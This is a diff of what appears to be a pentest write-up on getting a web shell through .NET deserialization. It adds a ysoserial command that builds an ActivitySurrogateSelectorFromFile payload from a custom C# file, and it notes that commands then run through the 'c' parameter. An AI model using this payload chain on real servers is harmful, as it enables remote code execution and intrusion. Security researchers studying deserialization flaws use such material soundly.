@@ -60,7 +60,7 @@ To sum up, you have to has to combine path traversal with arbitrary file upload,
 ## Deserialize
 In case of deserialize, each time we want to execute different command, we have to re-generate payload using ysoserial, then url encode, send request, etc, ... For better use, sometimes people manipulate deserialization to create web shell, but it leads to problem I already said in the overview above. But we really can get shell without creating files on the server with gadget ActivitySurrogateSelectorFromFile already included in ysoserial. This gadget will create an assembly with our custom C# code, then when deserialize, make the server load that assembly.
 
-First create shell.cs
+First create ExploitClass.cs
 
 ```csharp
 // ExploitClass.cs
@@ -90,5 +90,13 @@ class E{
         context.Response.End();
     }}
 ```
+
+Then using generate payload with ysoserial
+
+```bash
+ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --outputpath payload.txt
+```
+
+Then now we can execute any command via [c] parameter
 
 
